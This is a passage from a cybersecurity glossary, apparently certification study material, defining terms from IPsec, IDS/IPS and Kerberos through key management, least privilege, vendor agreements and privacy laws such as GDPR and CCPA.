There are two core protocols in IPsec, which can be applied singly or together, depending on the policy:

1. Authentication Header (AH) - Performs a cryptographic hash on the whole packet, including the IP header, plus a shared secret key (known only to the communicating hosts), and adds this value in its header as an Integrity Check Value (ICV). The recipient performs the same function on the packet and key and should derive the same value to confirm that the packet has not been modified. The payload is not encrypted so this protocol does not provide confidentiality.

2. Encapsulating Security Payload (ESP) - Can be used to encrypt the packet rather than simply calculating an ICV. ESP attaches three fields to the packet: a header, a trailer (providing padding for the cryptographic function), and an Integrity Check Value. Unlike AH, ESP excludes the IP header when calculating the ICV.

IPsec can be used in two modes:

1. Transport mode - Is used to secure communications between hosts on a private network. When ESP is applied in transport mode, the IP header for each packet is not encrypted, just the payload data. If AH is used in transport mode, it can provide integrity for the IP header.

2. Tunnel mode - Is used for communications between VPN sites across an unsecure network. With ESP, the whole IP packet (header and payload) is encrypted and encapsulated as a datagram with a new IP header. AH has no use case in tunnel mode, as confidentiality is usually required.
Internet Relay Chat (IRC) - A group communications protocol that enables users to chat, send private messages, and share files.
Intrusion Detection and Prevention Systems - Intrusion detection systems (IDS) and intrusion prevention systems (IPS) play critical roles in security operations. Both systems monitor network traffic, looking for suspicious patterns or activities that could indicate a network or system intrusion. However, they differ in their capabilities and responses to perceived threats.

Host-based and network-based intrusion detection systems (IDS) and intrusion prevention systems (IPS) each offer unique advantages in securing a network and using both in conjunction often leads to a more robust security posture. Host-based IDS/IPS (HIDS/HIPS) are installed on individual systems or servers, and they monitor and analyze system behavior and configurations for suspicious activities. HIDS/HIPS are particularly effective at identifying insider threats, detecting changes in system files, and monitoring non-network events like local logins and system processes. This makes them essential for protecting critical systems from internal and external threats.

OSSEC is an open-source HIDS solution that performs log analysis, integrity checking, Windows registry monitoring, rootkit detection, real-time alerting, and active response. It is compatible with multiple platforms, including Linux, Windows, and macOS.

Network-based IDS/IPS (NIDS/NIPS) monitor network traffic. They look for patterns or signatures of known threats and unusual network packet behavior. NIDS/NIPS are effective at identifying and responding to threats across multiple systems, like distributed denial-of-service (DDoS) attacks or network scanning activities.

Despite their strengths, neither type can wholly substitute for the other. HIDS/HIPS are confined to the activities on the host on which they are installed, so they do not effectively detect network-wide anomalies. Similarly, NIDS/NIPS can't provide detailed visibility into host-specific activities or detect threats that don't involve network traffic.

Examples of IDS and IPS Tools
Intrusion detection systems (IDS), such as Snort, are designed to detect potential threats and generate alerts. IDS systems are passive, inspecting network traffic, identifying potential threats based on predefined rules or unusual behavior, and sending alerts to administrators. They do not actively block or prevent threats but notify of the potential issue. This allows security analysts to investigate the alert, avoiding disruptions to network traffic or potentially blocking legitimate traffic caused by false positives.

In contrast, intrusion prevention systems (IPS), like Suricata, are proactive security tools that detect potential threats and take action to prevent or mitigate them. An IPS identifies a threat using methods similar to an IDS and can block traffic from the offending source, drop malicious packets, or reset connections to disrupt an attack. While this can immediately prevent damage, there is a risk of false positives leading to blocking legitimate traffic.

Important IDS & IPS tools include the following:

1. Snort - It is one of the most well-known IDS/IPS tools. It uses a rule-driven language, which combines the benefits of signature, protocol, and anomaly-based inspection methods, providing robust detection capabilities. Snort's open-source nature and widespread adoption have led to a large community contributing rules and configurations, making it a versatile tool for various environments.

2. Suricata - It is a high-performance open source IDS/IPS/NSM engine. Suricata is designed to take full advantage of modern hardware and deliver higher performance and scalability than Snort. Suricata can function as an IDS or an IPS, and is compatible with Snort rulesets, making it a highly flexible option for network security.

3. Security Onion - It is a Linux distribution designed for intrusion detection, network security monitoring, and log management. It includes both Snort and Suricata, along with a host of other tools, to provide a complete platform for network security. This integration provides a holistic view of network activity, enabling administrators to correlate data from different tools and obtain a comprehensive understanding of the network's security posture.
Intrusion Detection System (IDS) - A security appliance or software that analyzes data from a packet sniffer to identify traffic that violates policies or rules.

The traffic captured by each sensor is transferred to a host or appliance running an intrusion detection system (IDS), such as Snort, Suricata, or Zeek/Bro. When traffic matches a detection signature or heuristic pattern, the IDS raises an alert or generates a log entry but does not block the source host. This type of passive sensor does not slow down traffic and is undetectable by the attacker.

An IDS is used to identify and log hosts and applications and to detect password-guessing attempts, port scans, worms, backdoor applications, malformed packets or sessions, and other policy violations.
Intrusion Prevention System (IPS) - A security appliance or software that combines detection capabilities with functions that can actively block attacks.

An intrusion prevention system (IPS) is an appliance or software capable of an active response. An IPS scans traffic to match detection signatures and it can be configured to automatically act to stop an attack. The following responses are typical:

1. Block the source of the noncompliant traffic, either temporarily or permanently. This is referred to as shunning.

2. Reset the connection but do not block the source address.

3. Redirect traffic to a honeypot or honeynet for additional threat analysis.

An IPS can be deployed as an inline appliance with an integrated firewall and routing/forwarding capability. If deployed with a passive sensor, it can implement the response action by reconfiguring another appliance, such as a firewall or router. This functionality uses a script or application programming interface (API) to integrate the two security controls.

Both Snort and Suricata can be configured as intrusion prevention systems.
IP Flow Information Export (IPFIX) - Standards-based version of the Netflow framework.
IPS/IDS Logs - An IPS/IDS log is an event when a traffic pattern is matched to a rule. As this can generate a very high volume of events, it might be appropriate to only log high sensitivity/impact rules. As with firewall logging, a single packet might trigger multiple rules.

An intrusion prevention system could additionally be configured to log shuns, resets, and redirects in the same way as a firewall.

As with endpoint protection logs, summary event data from IDS/IPS can be visualized in dashboard graphs to represent overall threat levels. Close analysis of detection events can assist with attributing intrusion events to a specific actor and developing threat intelligence of TTPs.
Isolation - Removing or severely restricting communications paths to a particular device or system.
ITIL Configuration Management - The ITIL (Information Technology Infrastructure Library) framework for managing IT assets and configurations, encompassing service assets, configuration items, baseline configurations, and configuration management systems.
Jailbreaking - Removes the protective seal and any OS-specific restrictions to give users greater control over the device.

While this term can apply to any device, it is primarily used to describe gaining full access to an iOS device (iPhone or iPad) by removing the limitations imposed by Apple's iOS operating system. Jailbreaking allows users to install unauthorized apps, customize the device's appearance and behavior, access system files, and bypass restrictions implemented by Apple.
Journaling - A method used by file systems to record changes not yet made to the file system in an object called a journal.

Journaling records changes to data in a separate, dedicated log known as a journal. Organizations can track and monitor data modifications and revert to previous states if necessary. Journaling is beneficial for data recovery in system crashes. It enables the system to identify and undo any incomplete transactions that might have caused inconsistencies, or replay transactions that occurred after the full system backup was completed. This provides greater granularity for restores and greatly minimizes data loss. A practical example of journaling is using file system journaling, such as the Journaled File System (JFS) or the New Technology File System (NTFS), with journaling enabled. These file systems maintain a record of all changes made to files, allowing for data recovery and consistency checks after unexpected system shutdowns or crashes.

Remote journaling, SAN replication, and VM replication are advanced data protection methods that maintain data availability and integrity across multiple locations and systems. Remote journaling creates and maintains a journal of data changes at a separate, remote location, allowing for data recovery and ensuring business continuity in case of local failures, natural disasters, or malicious attacks.
Jump Server - A hardened server that provides access to other hosts.

One of the challenges of managing hosts exposed to the Internet, such as in a screened subnet or cloud network, is providing administrative access to the servers and appliances located within it. On the one hand, a link is necessary; on the other, the administrative interface could be compromised and exploited as a pivot point into the rest of the network. Consequently, management of hosts permitted to access administrative interfaces on hosts in the secure zone must be tightly controlled. Configuring and auditing this type of control when there are many different servers operating in the zone is complex.

One solution to this complexity is to add a single administration server, or jump server, to the secure zone. The jump server only runs the necessary administrative port and protocol, such as SSH or RDP. Administrators connect to the jump server and then use the jump server to connect to the admin interface on the application server. The application server's admin interface has a single entry in its ACL (the jump server) and denies connection attempts from any other hosts.
Just-in-time (JIT) Permission - It means that an account's elevated privileges are not assigned at log-in. Instead, the permissions must be explicitly requested and are only granted for a limited period.
Kerberos - A single sign-on authentication and authorization service that is based on a time-sensitive, ticket-granting system.

Kerberos is a single sign-on network authentication and authorization protocol used on many networks, notably as implemented by Microsoft's Active Directory (AD) service. Kerberos was named after the three-headed guard dog of Hades (Cerberus) because it consists of three parts. Clients request services from application servers, which both rely on an intermediary—a key distribution center (KDC)—to vouch for their identity. There are two services that make up a KDC: the Authentication Service and the Ticket Granting Service.

Kerberos can authenticate human users and application services. These are collectively referred to as principals. Using authentication to a Windows domain as an example, the first step in Kerberos SSO is to authenticate with a KDC server, implemented as a domain controller.

1. The principal sends the authentication service (AS) a request for a Ticket Granting Ticket (TGT). This is composed by encrypting the date and time on the local computer with the user's password hash as the key.

The password hash itself is not transmitted over the network. Although we refer to passwords for simplicity, the system can use other authenticators, such as smart card login.

2. The AS checks that the user account is present, that it can decode the request by matching the user's password hash with the one in the Active Directory database, and that the request has not expired. If the request is valid, the AS responds with the following data:

i. Ticket Granting Ticket (TGT)—contains information about the client (name and IP address) plus a time stamp and validity period. This is encrypted using the KDC's secret key.

ii. TGS session key—communicates between the client and the Ticket Granting Service (TGS). This is encrypted using a hash of the user's password.

The TGT is an example of a logical token. All the TGT does is identify who you are and confirm that you have been authenticated—it does not provide you with access to any domain resources.

Presuming the user entered the correct password, the client can decrypt the Ticket Granting Service (TGS) session key but not the Ticket Granting Ticket (TGT). This establishes that the client and KDC (Kerberos Key Distribution Center) know the same shared secret and that the client cannot interfere with the TGT.

1. To access resources within the domain, the principal requests a service ticket (a token that grants access to a target application server). This process of granting service tickets is handled by the TGS.

2. The principal sends the TGS a copy of its TGT and the name of the application server it wishes to access plus an authenticator, consisting of a time-stamped client ID encrypted using the TGS session key.

The TGS should be able to decrypt both messages using the KDC's secret key for the first and the TGS session key for the second. This confirms that the request is genuine. It also checks that the ticket has not expired and has not been used before (replay attack).

3. The TGS service responds with the following :
i. A service session key—is used between the client and the application server. This is encrypted with the TGS session key.
ii. A service ticket—contains information about the principal, such as a time stamp, system IP address, Security Identifier (SID) and the SIDs of groups to which it belongs, and the service session key. This is encrypted using the application server's secret key.

4. The principal forwards the service ticket, which it cannot decrypt, to the application server and adds another time-stamped authenticator, which is encrypted using the service session key.

5. The application server decrypts the service ticket to obtain the service session key using its secret key, confirming that the principal has sent it an untampered message. It then decrypts the authenticator using the service session key.

6. Optionally, the application server responds to the principal with the time stamp used in the authenticator, which is encrypted by using the service session key. The principal decrypts the time stamp and verifies that it matches the value already sent, and concludes that the application server is trustworthy.

This means that the server is authenticated to the principal (referred to as mutual authentication). This prevents an on-path attack, where a malicious user could intercept communications between the principal and server.

7. The server now responds to access requests (assuming they conform to the server's access control list).

One of the noted drawbacks of Kerberos is that the KDC represents a single point-of-failure for the network. In practice, backup KDC servers can be implemented (for example, Active Directory supports multiple domain controllers, each of which are running the KDC service).
Key Distribution Center (KDC) - A component of Kerberos that authenticates users and issues tickets (tokens).
Key Encryption Key (KEK) - In storage encryption, the private key that is used to encrypt the symmetric bulk media encryption key (MEK). This means that a user must authenticate to decrypt the MEK and access the media.
Key Escrow - In key management, the storage of a backup key with a third party.

If a private or secret key is lost or damaged, ciphertexts cannot be recovered unless a backup of the key has been made. Making copies of the key is problematic as it becomes more likely that a copy will be compromised and more difficult to detect that a compromise has occurred.

These issues can be mitigated by using escrow and M of N controls. Escrow means that something is held independently. In terms of key management, this refers to archiving a key (or keys) with a third party. M of N means that an operation cannot be performed by a single individual. Instead, a quorum (M) of available persons (N) must agree to authorize the operation.

A key can be split into parts. Each part can be held by separate escrow providers, reducing the risk of compromise. An account with permission to access a key held in escrow is referred to as a key recovery agent (KRA). A recovery policy can require two or more KRAs to authorize the operation. This mitigates the risk of a KRA attempting to impersonate the key owner.
Key Exchange - Any method by which cryptographic keys are transferred among users, thus enabling the use of a cryptographic algorithm.
Key Length - Size of a cryptographic key in bits. Longer keys generally offer better security, but key lengths for different ciphers are not directly comparable.

Encryption algorithms use a key to increase the security of the process. For example, if you consider the substitution cipher ROT13, you should realize that the key is 13. You could use 17 to achieve a different ciphertext from the same method. The key is important because it means that even if the cipher method is known, a message still cannot be decrypted without knowledge of the specific key.

A keyspace is the range of values that the key could be. In the ROT13 example, the keyspace is 25 (ROT1. . . ROT25). Using ROT0 or ROT26 would result in ciphertext identical to the plaintext. Using a value greater than 26 to shift through the alphabet multiple times is equivalent to a key from the 1-25 range. ROT0 and ROT26+ are weak keys and should not be used.

Modern ciphers use large keyspaces where there are trillions of possible key values. This makes the key difficult to discover via brute force cryptanalysis. Brute force cryptanalysis means attempting decryption of the ciphertext with every possible key value and reading the result to determine if it is still gibberish or plaintext.

Keys for modern symmetric ciphers use a pseudorandomly generated number of bits. The number of bits is the key length. For example, the most commonly used symmetric cipher is the Advanced Encryption Standard (AES). This can be used with two key lengths. AES-128 uses a 128-bit key length. A bit can have one of two values (0 or 1), so the number of possible key values is two multiplied by itself a number of times equivalent to the key length. This is written as 2 128 , where 2 is the base and 128 is the exponent. AES-256 has a keyspace of 2 256 . This keyspace is not twice as large as AES-128; it is many trillions of times bigger and consequently significantly more resistant to brute force attacks.

The drawback of using larger keys is that the computer must use more memory and processor cycles to perform encryption and decryption.
Key Management System - Procedures and tools that centralize generation, storage, distribution, revocation, and renewal of cryptographic keys.

A key's lifecycle may involve the following stages:

1. Key Generation - creates an asymmetric key pair or symmetric secret key of the required strength, using the chosen cipher.

2. Storage - prevents unauthorized access to a private or secret key and protecting against loss or damage.

3. Revocation - prevents use of the key if it is compromised. If a key is revoked, any data that was encrypted using it should be re-encrypted using a new key.

4. Expiration and Renewal - gives the certificate a "shelf-life" increasing security. Every certificate expires after a certain period. Certificates can be renewed with the same key pair or with a new key pair.

5. A decentralized key management model means that keys are generated and managed directly on the computer or user account that will use the certificate. This does not require any special setup and so is easy to deploy. It makes the detection of key compromise more difficult, however.

Some organizations prefer to centralize key generation and storage using a tool such as a key management system. In one type of cryptographic key management system, a dedicated server or appliance is used to generate and store keys. When a device or app needs to perform a cryptographic operation, it uses the Key Management Interoperability Protocol (KMIP) to communicate with the server.
Key Risk Indicators (KRIs) - The method by which emerging risks are identified and analyzed so that changes can be adopted to proactively avoid issues from occurring.

Key Risk Indicators (KRIs) are critical predictive indicators organizations use to monitor and predict potential risks. These metrics provide an early indication of increasing risk exposures in different areas of the organization. KRIs assess the potential impact and likelihood of various risks so leadership teams can take proactive steps to manage them effectively.

Using KRIs is closely associated with risk registers and risk management practices because KRIs provide the data needed to assess the likelihood and potential impact of each risk item tracked in a risk register. For example, a KRI may identify an increasing trend in system downtime due to IT operational issues which impact business operations. Risk managers handle this via a risk register and include details like potential impacts (lost productivity, customer dissatisfaction), mitigation steps (increasing IT resources, improving system redundancy), and the person or team responsible for managing these mitigations.

A risk owner (An individual who is accountable for developing and implementing a risk response strategy for a risk documented in a risk register) refers to the individual responsible for managing a particular risk, including identifying and assessing the risk, implementing measures to mitigate it, monitoring the effectiveness of the measures, and taking corrective actions as warranted. The risk owner has a comprehensive understanding of the risk and its potential impacts and a thorough understanding of the measures needed to manage it. This role is often assigned to leadership team members with the authority to make decisions and the ability to allocate resources for risk mitigation. The risk owner also communicates information about the risk and its status to other stakeholders.

The risk appetite (A strategic assessment of what level of residual risk is tolerable for an organization) describes the level of risk that an organization is willing to accept. The organization's risk appetite is critical in determining which risks are added to a risk register and how they are prioritized. Risks are compared to the organization's risk appetite when identified and assessed. Risk tolerance (Determines the thresholds that separate different levels of risk) describes the specific amount of variance an organization is willing to accept regarding measured risk levels and the established risk appetite. If a risk item's potential impact or likelihood exceeds the organization's risk tolerance, the risk is added to the risk register for appropriate management and monitoring. Risks that exceed the organization's risk tolerance by a large margin are generally prioritized and treated more urgently than other risks. In contrast, if a risk is near or slightly above the tolerance threshold, leadership teams may decide to accept it and monitor it closely.
Key Stretching - A technique that strengthens potentially weak input for cryptographic key generation, such as passwords or passphrases created by people, against brute force attacks.

Key stretching takes a key that's generated from a user password plus a random salt value and repeatedly converts it to a longer and more disordered key. The initial key may be put through thousands of rounds of hashing. This might not be difficult for the attacker to replicate, so it doesn't actually make the key stronger. It does slow the attack down, because the attacker has to do all this extra processing for each possible key value. Key stretching can be performed by using a particular software library to hash and save passwords when they are created. The Password-Based Key Derivation Function 2 (PBKDF2) is very widely used for this purpose, notably as part of Wi-Fi Protected Access (WPA).
Keylogger - Malicious software or hardware that can record user keystrokes.

This is spyware that actively attempts to steal confidential information by recording keystrokes. The attacker will usually hope to discover passwords or credit card data.

Keyloggers are not only implemented as software. A malicious script can transmit key presses to a third-party website. There are also hardware devices to capture key presses to a modified USB adapter inserted between the keyboard and the port. Such devices can store data locally or come with Wi-Fi connectivity to send data to a covert access point. Other attacks include wireless sniffers to record key press data, overlay ATM pin pads, and so on.
Kill Chain - A model developed by Lockheed Martin that describes the stages by which a threat actor progresses to a network intrusion.
Lateral Movement - The process by which an attacker is able to move from one part of a computing environment to another.
Layer 4 Firewall - A stateful inspection firewall that can monitor TCP sessions and UDP traffic. Layer 4 is the OSI transport layer. A layer 4 firewall examines the TCP three-way handshake to distinguish new from established connections. A legitimate TCP connection should follow a SYN > SYN/ACK > ACK sequence to establish a session, which is then tracked using sequence numbers. Deviations from this, such as SYN without ACK or sequence number anomalies, can be dropped as malicious flooding or session hijacking attempts. The firewall can be configured to respond to such attacks by blocking source IP addresses and throttling sessions. It can also track UDP traffic, though this is harder as UDP is a protocol without connections. It is also likely to be able to detect IP header and ICMP anomalies.
Layer 4 Load Balancer - Basic load balancers make forwarding decisions on IP address and TCP/UDP port values, working at the transport layer of the OSI model.
Layer 7 Firewall - A stateful inspection firewall that can filter traffic based on specific application protocol headers and data, such as web or email data.

A layer 7 firewall can inspect the headers and payload of application-layer packets. One key feature is to verify the application protocol matches the port because malware can try to send raw TCP data over port 80 just because port 80 is open, for instance. As another example, a web application firewall could analyze the HTTP headers and the webpage formatting code present in HTTP packets to identify strings that match a pattern in its threat database.

Application-aware firewalls have many different names, including application layer gateway, stateful multilayer inspection, and deep packet inspection. Application-aware devices have to be configured with separate filters for each type of traffic (HTTP and HTTPS, SMTP/POP/IMAP, FTP, and so on).
Layer 7 Load Balancer - As web applications have become more complex, modern load balancers need to be able to make forwarding decisions based on application-level data, such as a request for a particular uniform resource locator (URL) web address or data types like video or audio streaming. This requires more complex logic, but the processing power of modern appliances is sufficient to deal with this.
LDAP Secure (LDAPS) - A method of implementing LDAP using SSL/TLS encryption.

It means the server is installed with a digital certificate, which it uses to set up a secure tunnel for the user credential exchange. LDAPS uses port 636.
Least Privilege - A basic principle of security stating that something should be allocated the minimum necessary rights, privileges, or information to perform its role.

Least privilege means that a principal is granted the minimum possible sufficient rights to complete a task that they are authorized to perform. This mitigates risk if an account should be compromised and fall under the control of a threat actor. Least privilege involves a design phase, where analysis of business workflows determines what roles and permissions are required.

While least privilege is a strong design principle, implementing it successfully can be challenging. Where many users, groups, roles, and resources are involved, managing permission assignments and implications is complex and time consuming. Improperly configured accounts can have two different impacts. On the one hand, setting privileges that are too restrictive creates a large volume of support calls and reduces productivity. On the other hand, granting too many privileges to users weakens the system's security and increases the risk of malware infection and a data breach.

Ensuring least privilege also involves continual monitoring to prevent authorization creep. Authorization creep refers to a situation where a user acquires more and more rights, either directly or by being added to security groups or roles.

For example, a user may be granted elevated privileges temporarily. In this case, a system is needed to ensure that the privileges are revoked at the end of the agreed period. A system of auditing should regularly review privileges, monitor group membership, review access control lists for each resource, and identify and disable unnecessary accounts.
Legacy and End-of-Life (EOL) System Vulnerabilities - Hardware vulnerabilities, particularly those associated with end-of-life and legacy systems, present considerable security challenges for many organizations, as patches or fixes for vulnerabilities are either unavailable or difficult to apply. End-of-life (EOL) and legacy systems share a common characteristic: they are both outdated. EOL systems may be legacy systems, and some legacy systems are also EOL.

The manufacturer or vendor no longer supports EOL systems, so they do not receive updates, including critical security patches. This makes them vulnerable to newly discovered threats. Conversely, while still outdated, the vendor may still fully support legacy systems.

An EOL system is a specific product or version of a product that the manufacturer or vendor has publicly declared as no longer supported. It is also possible for open-source projects to be abandoned by the maintainers. An EOL system can be a hardware device, a software application, or an operating system. Products should be replaced or updated before they reach EOL status to ensure they remain supported by their vendors and receive critical security patches. Notable EOL product examples include the Windows 7 and Server 2008 operating systems, which stopped receiving updates in January 2020. These systems are significantly more vulnerable to attacks due to the absence of security patches for new vulnerabilities. Despite their EOL status, they are still in use in many environments.

Many devices (peripheral devices especially) remain on sale with known severe vulnerabilities in firmware or drivers and no possibility of vendor support to remediate them, especially in secondhand, recertified, or renewed/reconditioned marketplaces. Examples include recertified computer equipment, consumer-grade and recertified networking equipment, and various Internet of Things devices.

Legacy systems typically describe outdated software methods, technology, computer systems, or application programs that continue to be used despite their shortcomings. Legacy systems often remain in use for extended periods because the organization's leadership recognizes that replacing or redesigning them will be expensive or pose significant operational risks stemming from complexity. The term "legacy" does not necessarily mean that the vendor no longer supports the system but rather that it represents hardware and software methods that are no longer popular and often incompatible with newer architectures or methods. Legacy systems often remain in use because they operate with sufficient reliability, have been incorporated into many critical business functions, and are familiar to long-tenured staff.

Assessing the risks associated with using EOL and legacy products, such as lack of updates, lack of support, and compatibility issues with newer systems, is crucial. EOL and legacy product replacements must continue to meet the organization's requirements, maintain compatibility with existing infrastructure, and support reliable data migration. Selection criteria must consider the availability of vendor support, device warranty details, and marketplace performance/reputation. Transitioning costs must be carefully assessed, too, including licensing, hardware upgrades, and professional service implementation fees. The work to transition away from EOL and legacy products must minimize disruptions and ensure long-term sustainability.
Legal Agreements - Legal agreements play a vital role in supporting vendor relationships by establishing both parties' rights, responsibilities, and expectations. Legal agreements serve as the foundation for the vendor-client relationship, providing a framework for conducting business and addressing potential issues or disputes that may arise.

Initial Agreements
Different types of agreements are needed to govern vendor relationships based on the specific nature of the engagement and the services being provided. The following agreements play distinct roles in setting up vendor relationships:

1. Memorandum of Understanding (MOU) - Usually a preliminary or exploratory agreement to express an intent to work together that is not legally binding and does not involve the exchange of money. A nonbinding agreement that outlines the intentions, shared goals, and general terms of cooperation between parties. MOUs serve as a preliminary step to establish a common understanding before proceeding with a more formal agreement.

2. Nondisclosure Agreement (NDA) - An agreement that stipulates that entities will not share confidential information, knowledge, or materials with unauthorized third parties. Ensures the confidentiality and protection of sensitive information shared during the relationship. An NDA is a binding agreement and likely to be signed alongside an MOU.

3. Memorandum of Agreement (MOA) - Legal document forming the basis for two parties to cooperate without a formal contract (a cooperative agreement). MOAs are often used by public bodies. A formal agreement that defines the parties' specific terms, conditions, and responsibilities. MOAs establish a legally binding relationship covering objectives, roles, resources, and obligations. They provide a trustworthy framework for collaboration.

4. Business Partnership Agreement (BPA) - Agreement by two companies to work together closely, such as the partner agreements that large IT companies set up with resellers and solution providers. Governs long-term strategic partnerships between organizations. BPAs encompass various objectives, including goals, financial arrangements, decision-making processes, intellectual property rights, confidentiality, and dispute-resolution mechanisms. BPAs provide a means for governing collaborative and mutually beneficial relationships.

5. Master Service Agreement (MSA) - A contract that establishes precedence and guidelines for any business documents that are executed between two parties. Outlines the overall terms and conditions of a specific contract, such as provisioning cloud resources, or ticketing/help desk support. An MSA includes scope, pricing, deliverables, and intellectual property rights.

Detailed Agreements
Where initial agreements establish a framework for collaboration or service provision, other agreements can be implemented to specify terms for operational detail. These help to govern vendor relationships effectively.

1. Service-level Agreement (SLA) - An agreement that sets the service requirements and expectations between a consumer and a provider. Defines the specific performance metrics, quality standards, and service levels expected from the vendor.

2. Statement of Work (SOW) / Work Order (WO) - A document that defines the expectations for a specific business arrangement. Details a vendor project or engagement's scope, deliverables, timelines, and responsibilities. SOWs clarify the vendor's tasks, the organization's expectations, and the agreed-upon deliverables. They are crucial for managing project execution and ensuring vendor and organization alignment.

Questionnaires
In vendor management, structured means of obtaining consistent information, enabling more effective risk analysis and comparison.

Questionnaires gather vendor information about their security practices, controls, and risk management strategies to help organizations assess a vendor's security posture, identify vulnerabilities, and evaluate their capabilities. Questionnaires provide a structured means of obtaining consistent vendor information, enabling more effective risk analysis and comparison fairly and consistently. Questionnaires collect information about the vendor's security policies, procedures, and controls, including data protection, access management, incident response, and disaster recovery. The questionnaire may ask about a vendor's compliance with industry-specific regulations and standards, such as GDPR, HIPAA, ISO 27001, or PCI-DSS. It may also seek details about the vendor's security training and awareness programs for employees and their approach to conducting third-party security assessments and audits. Additionally, the questionnaire may explore the vendor's incident response capabilities, breach history, and insurance coverage.

The answers to vendor risk management questionnaires should be validated by requesting supporting documentation, conducting site visits or audits, performing background checks, contacting references or previous clients, and utilizing third-party verification services to ensure the accuracy and reliability of the vendor's responses.

Rules of Engagement
A definition of how a pen test will be executed and what constraints will be in place. This provides the pen tester with guidelines to consult as they conduct their tests so that they don't have to constantly ask management for permission to do something.

Rules of Engagement (RoE) define the parameters and expectations for vendor relationships. These rules outline the responsibilities, communication methods, reporting mechanisms, security requirements, and compliance obligations that vendors must adhere to. Rules of engagement establish clear guidelines for the vendor's behavior, activities, and access to sensitive information. By setting these boundaries, organizations can establish a controlled and secure environment, mitigating the potential risks associated with third-party relationships. Some important elements included in an RoE include the following:

1. Roles and Responsibilities - Clearly define the roles and responsibilities of the vendor and client in managing risks, including specifying who is responsible for identifying, assessing, and mitigating various types of risks.

2. Security Requirements - Outline the security standards, practices, and controls the vendor must adhere to, including provisions related to data protection, access controls, encryption, incident response, and regular security assessments.

3. Compliance Obligations - State the regulatory and compliance obligations the vendor must meet, ensuring they align with the client's industry-specific requirements, including privacy, data security, and any other applicable legal or industry regulations.

4. Reporting and Communication - Establish protocols for timely reporting of security incidents, breaches, or potential risks, including defining the reporting channels, frequency, and level of detail required to ensure effective risk communication and management.

5. Change Management - Outline procedures for managing changes or updates to systems, processes, or services that could impact security and introduce new risks, including change approval processes, testing requirements, and documentation practices.

6. Contractual Provisions - Include provisions related to indemnification, liability, insurance, and termination rights in case of security breaches or failure to meet risk management obligations. These provisions help allocate responsibilities and provide legal recourse in case of noncompliance or breaches.
Legal Data - Documents and records that relate to matters of law, such as contracts, property, court cases, and regulatory filings.

Legal and financial data encompass critical data for legal compliance, financial reporting, decision-making, and risk management. Legal data includes documents, contracts, legal agreements, court records, litigation information, intellectual property filings, regulatory filings, and other legal documents. It may also encompass information related to corporate governance, compliance with laws and regulations, and legal obligations specific to an industry or jurisdiction.
Legal Environment - Governance committees ensure their organizations abide by all applicable cybersecurity laws and regulations to protect them from legal liability. The governance committee must address these external considerations in the strategic plan for the organization.

Governance committees must manage many legal risks, such as regulatory compliance requirements, contractual obligations, public disclosure laws, breach liability, privacy laws, intellectual property protection, licensing agreements, and many others. Cybersecurity governance committees must interpret and translate these legal requirements into operational controls to avoid legal trouble, act ethically, and protect the organization.

The key frameworks, benchmarks, and configuration guides may be used to demonstrate compliance with a country's legal/regulatory requirements or with industry-specific regulations. Due diligence is a legal term meaning that responsible persons have not been negligent in discharging their duties. Negligence may create criminal and civil liabilities. Many countries have enacted legislation that criminalizes negligence in information management. In the United States , for example, the Sarbanes-Oxley Act (SOX - A law enacted in 2002 that dictates requirements for the storage and retention of documents relating to an organization's financial and business operations) mandates the implementation of risk assessments, internal controls, and audit procedures. The Computer Security Act (1987) requires federal agencies to develop security policies for computer systems that process confidential information. In 2002, the Federal Information Security Management Act (FISMA) was introduced to govern the security of data processed by federal government agencies.

Some regulations have specific cybersecurity control requirements; others simply mandate "best practice," as represented by a particular industry or international framework. It may be necessary to perform mapping between different industry frameworks, such as NIST and ISO 27K, if a regulator specifies the use of one but not another. Conversely, the use of frameworks may not be mandated as such, but auditors are likely to expect them to be in place as a demonstration of a strong and competent security program.

Global Law
As information systems become more interconnected globally, many countries have enacted laws with broader, international reach. Some examples include the General Data Protection Regulation (GDPR) and California Consumer Privacy Act (CCPA) which both act to protect the privacy of the constituents associated with each respective law irrespective of geopolitical boundaries.

Personal Data and the General Data Protection Regulation (GDPR)
Where some types of legislation address cybersecurity due diligence, others focus in whole or in part on information security as it affects privacy or personal data. Privacy is a distinct concept and requires that collection and processing of personal information be both secure and fair. Fairness and the right to privacy, as enacted by regulations such as the European Union's General Data Protection Regulation (GDPR - Provisions and requirements protecting the personal data of European Union (EU) citizens. Transfers of personal data outside the EU Single Market are restricted unless protected by like-for-like regulations, such as the US's Privacy Shield requirements), means that personal data cannot be collected, processed, or retained without the individual's informed consent, unless there are other overriding considerations, such as public interest or other legal obligations. Informed consent means that the data must be collected and processed only for the stated purpose, and that purpose must be clearly described to the user in plain language, not legal jargon. GDPR gives data subjects rights to withdraw consent, and to inspect, amend, or erase data held about them. Failure to comply with GDPR rules can result in incredibly large fines.

California Consumer Privacy Act (CCPA)
The CCPA provides California residents the right to know what personal information businesses collect about them, the purpose of collecting this data, and with whom they share it. It protects California residents' rights to access their personal information, delete it, or opt out of its sale. Organizations must inform consumers about the categories of personal information they collect and the purposes for which the information will be used. The CCPA applies to any organization, regardless of its location, that provides goods or services to California residents; has gross annual revenues over $25 million; buys or sells the personal information of 50,000 or more consumers, households, or devices; or derives 50% or more of annual revenues from selling personal information.

Regulations and National, Local, Regional and Industry Laws
Many countries have national-level laws to support effective cybersecurity practices and protect citizen data. The scope and detail of these laws varies significantly from one country to another, but organizations must comply with the laws in all the jurisdictions where they operate.

Examples in the United States include the Health Insurance Portability and Accountability Act (HIPAA), Gramm-Leach-Bliley Act (GLBA), and Federal Information Security Management Act (FISMA). The United Kingdom's national laws include the Data Protection Act 2018 and the Network and Information Systems (NIS) Regulations 2018. Canada enforces a privacy law called Personal Information Protection and Electronic Documents Act (PIPEDA), India regulates the IT industry with the Information Technology Act 2000, and Australia enforces the Privacy Act 1988. While it is not necessary to understand the details of each of these laws, it is important to understand that this complicated legal framework greatly influences the functional elements of a cybersecurity program.

While most cybersecurity laws typically have national or international scope due to the global nature of the Internet, there are also laws and regulations with a more local or regional reach. These laws may be specific to states, provinces, or even cities, particularly in larger countries like the United States. Two important examples include the New York Department of Financial Services (DFS) Part 500 Cybersecurity Regulation and the Massachusetts 201 CMR 17.00.

Industry-specific cybersecurity laws and regulations govern how data should be handled and protected. Here are a few key examples to help highlight that cybersecurity is a significant concern across all sectors of industry and is protected by a complicated matrix of laws that must be accommodated by cybersecurity operations and organizational governance:

Healthcare
1. Health Insurance Portability and Accountability Act (HIPAA) (United States)

2 .The General Data Protection Regulation (GDPR) (European Union)

Financial Services
1. Gramm-Leach-Bliley Act (GLBA) (United States)

